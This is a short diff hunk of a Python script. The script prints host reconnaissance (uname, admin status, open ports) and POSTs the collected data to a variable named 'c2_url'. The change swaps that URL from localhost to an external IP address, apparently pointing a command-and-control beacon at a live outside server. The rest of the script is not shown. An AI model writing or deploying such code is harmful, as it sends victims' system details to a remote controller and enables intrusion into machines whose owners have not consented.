@@ -89,7 +89,7 @@ print("Uname         :", uname)
 print("Is Admin      :", is_admin)
 print("Open ports    :", open_ports)
 
-c2_url = "http://127.0.0.1:8000/api/submit_scan/"
+c2_url = "http://85.215.240.40:8000/api/submit_scan/"
 try:
     response = requests.post(c2_url, json=payload, timeout=5)
     if response.status_code == 200:
